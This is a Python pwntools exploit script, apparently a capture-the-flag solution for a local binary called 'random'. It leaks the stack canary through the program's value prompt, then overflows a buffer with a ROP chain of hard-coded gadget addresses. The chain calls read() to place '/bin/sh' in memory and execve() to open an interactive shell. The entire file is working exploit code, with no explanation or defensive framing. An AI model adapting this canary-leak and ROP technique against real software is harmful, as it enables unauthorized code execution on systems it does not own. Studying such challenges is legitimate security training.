from pwn import *

context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

cn = process('./random')
bin = ELF('./random')

def z():
	gdb.attach(cn)
	raw_input()

prdi=0x0000000000400f63
prsi_r15=0x0000000000400f61
'''
.rodata:0000000000400F88                 mov     rdx, rsi
.rodata:0000000000400F8B                 retn

.rodata:0000000000400F8C                 pop     rax
.rodata:0000000000400F8D                 pop     rdi
.rodata:0000000000400F8E                 retn

.rodata:0000000000400F8F                 syscall
.rodata:0000000000400F91                 retn
'''
cn.recvuntil('Pick a value between 1-7')
canary=0
for i in range(1,8):
	cn.sendlineafter('What random value do you want to get?',str(i))
	cn.recvuntil('Your value = ')
	data = int(cn.recvuntil('\n'))
	canary+=data<<(8*i)

log.success('canary: '+hex(canary))

pay = 'a'*0x408 + p64(canary) + 'bbbbbbbb'
pay += p64(0x0000000000400F8C) + p64(0) + p64(0)#rax=0,rdi=0
pay += p64(0x0000000000400f61) + p64(8) + p64(0)#rsi=8,r15=0
pay += p64(0x0000000000400F88)#rdx=8
pay += p64(0x0000000000400f61) + p64(bin.bss()+0x400) + p64(0)
pay += p64(0x0000000000400F8F)#read(0,bss+0x400,8)

pay += p64(0x0000000000400F8C) + p64(59) + p64(bin.bss()+0x400)#rax=59,rdi=bss
pay += p64(0x0000000000400f61) + p64(0) + p64(0)#rsi=0,r15=0
pay += p64(0x0000000000400F88)#rdx=0
pay += p64(0x0000000000400f61) + p64(0) + p64(0)
pay += p64(0x0000000000400F8F)#execve('/bin/sh',0,0)
cn.sendline('0')
cn.recvuntil('Leave a comment:')
#z()
cn.sendline(pay)
cn.send('/bin/sh\x00')
cn.interactive()#b*0x0000000000400D92
